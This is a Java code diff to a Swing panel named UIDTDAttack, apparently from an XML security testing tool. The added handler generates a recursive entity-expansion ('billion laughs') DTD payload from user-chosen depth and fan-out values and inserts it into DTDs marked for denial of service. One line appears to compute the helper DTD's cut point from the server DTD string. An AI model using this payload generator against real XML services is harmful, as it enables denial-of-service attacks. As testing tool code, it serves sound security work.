@@ -30,6 +30,7 @@ import java.awt.event.ItemEvent;
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.regex.Pattern;
 import javax.swing.JScrollPane;
 import javax.swing.JTextArea;
 import javax.swing.ScrollPaneConstants;
@@ -166,6 +167,7 @@ public class UIDTDAttack extends javax.swing.JPanel implements IAttack{
         jLabel9.setText("Selected DTD: ");
 
         adjustDTDButton.setText("Adjust");
+        adjustDTDButton.setToolTipText("Write only numbers.");
         adjustDTDButton.setEnabled(false);
         adjustDTDButton.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
@@ -320,7 +322,26 @@ public class UIDTDAttack extends javax.swing.JPanel implements IAttack{
     }//GEN-LAST:event_targetFileListValueChanged
 
     private void adjustDTDButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_adjustDTDButtonActionPerformed
-      
+	if (Pattern.matches("[0-9]+", recursiveEntitieTextField.getText()) && Pattern.matches("[0-9]+", entityReferencesTextField.getText())) {
+            String tmp = "\n";
+            int rec = Integer.parseInt(recursiveEntitieTextField.getText());
+            int entity = Integer.parseInt(entityReferencesTextField.getText());
+            for (int i = 1; i <= rec; i++) {
+                tmp += "<!ENTITY a" + i + " \"";		
+                for (int j = 1; j <= entity; j++) {
+                    tmp += "&a" + (i-1);
+                }
+                tmp += "\">\n";
+            }
+            tmp += "]>\n" + "<data>&a" + rec + ";</data>";
+            if(selectedDtdServer.contains("\"dos\" >")) {
+                currentDtdServer = selectedDtdServer.substring(0, selectedDtdServer.lastIndexOf("\"dos\" >")+7).concat(tmp); 
+            }
+            if(selectedDtdHelper.contains("\"dos\" >")) {
+                currentDtdHelper = selectedDtdHelper.substring(0, selectedDtdServer.lastIndexOf("\"dos\" >")+7).concat(tmp); 
+            }
+            setDTD();
+        }
     }//GEN-LAST:event_adjustDTDButtonActionPerformed
 
     /**
